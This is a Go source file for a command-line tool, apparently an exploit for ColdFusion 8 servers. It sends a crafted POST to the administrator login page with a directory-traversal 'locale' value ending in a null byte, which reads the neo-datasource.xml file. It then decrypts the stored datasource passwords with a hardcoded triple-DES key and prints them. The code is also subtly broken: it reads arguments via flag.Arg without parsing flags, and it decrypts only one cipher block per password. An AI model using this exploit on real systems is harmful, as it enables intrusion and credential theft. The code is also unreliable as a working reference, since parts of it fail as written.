package main

import (
	"bytes"
	"crypto/des"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
)

// Constants
const decryptionKey = "0yJ!@1$r8p0L@r1$6yJ!@1rj"

// Usage prints the usage information
func usage() {
	fmt.Println("cfneo downloads the neo-datasource.xml file from a vulnerable")
	fmt.Println("ColdFusion server then parses the file to find the encrypted")
	fmt.Println("passwords. The passwords are decrypted and written to stdout.")
	fmt.Println()
	fmt.Println("Usage: cfneo <server> <port>")
}

// decrypt decrypts the ColdFusion password using DES-EDE3
func decrypt(cpass string) (string, error) {
	cipher, err := des.NewTripleDESCipher([]byte(decryptionKey))
	if err != nil {
		return "", err
	}

	cpassDecoded, err := base64.StdEncoding.DecodeString(cpass)
	if err != nil {
		return "", err
	}

	decrypted := make([]byte, len(cpassDecoded))
	cipher.Decrypt(decrypted, cpassDecoded)

	// Removing padding bytes if present
	unpadded := bytes.TrimRight(decrypted, "\x00")

	return string(unpadded), nil
}

// getPasswords extracts encrypted passwords from the XML data
func getPasswords(data string) []string {
	var passwords []string

	// Regular expression to find Base64 encoded strings in the XML file
	re := regexp.MustCompile(`<string>([a-zA-Z0-9+/]+=*)</string>`)
	matches := re.FindAllStringSubmatch(data, -1)

	for _, match := range matches {
		passwords = append(passwords, match[1])
	}

	return passwords
}

// downloadFile downloads the neo-datasource.xml file from the server
func downloadFile(server string, port int) (string, error) {
	client := &http.Client{}

	url := fmt.Sprintf("http://%s:%d/CFIDE/administrator/enter.cfm", server, port)
	locale := "locale=../../../../../../../../../../ColdFusion8/lib/neo-datasource.xml%00en"

	// Set up the request
	req, err := http.NewRequest("POST", url, strings.NewReader(locale))
	if err != nil {
		return "", err
	}

	req.Header.Set("Host", server)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(locale)))

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Extract the title (which is assumed to contain the XML content)
	re := regexp.MustCompile(`<title>(.*)</title>`)
	matches := re.FindStringSubmatch(string(body))
	if len(matches) == 0 {
		return "", fmt.Errorf("no XML data found in response")
	}

	return matches[1], nil
}

// printTable prints the encrypted and decrypted passwords in a tabular format
func printTable(passwords []string) {
	fmt.Printf("%-50s %-50s\n", "Encrypted", "Decrypted")
	fmt.Println(strings.Repeat("=", 100))

	for _, enc := range passwords {
		dec, err := decrypt(enc)
		if err != nil {
			fmt.Printf("%-50s %-50s\n", enc, "[ERROR DECRYPTING]")
		} else {
			fmt.Printf("%-50s %-50s\n", enc, dec)
		}
	}
}

// Main function
func main() {
	// Parsing command-line arguments
	if len(os.Args) != 3 {
		usage()
		return
	}

	server := flag.Arg(0)
	portStr := flag.Arg(1)

	// Convert port to an integer
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("[-] Error converting port to integer: %v\n", err)
		return
	}

	data, err := downloadFile(server, port)
	if err != nil {
		fmt.Printf("[-] Error downloading file: %v\n", err)
		return
	}

	// Extract and decrypt passwords
	passwords := getPasswords(data)
	printTable(passwords)
}

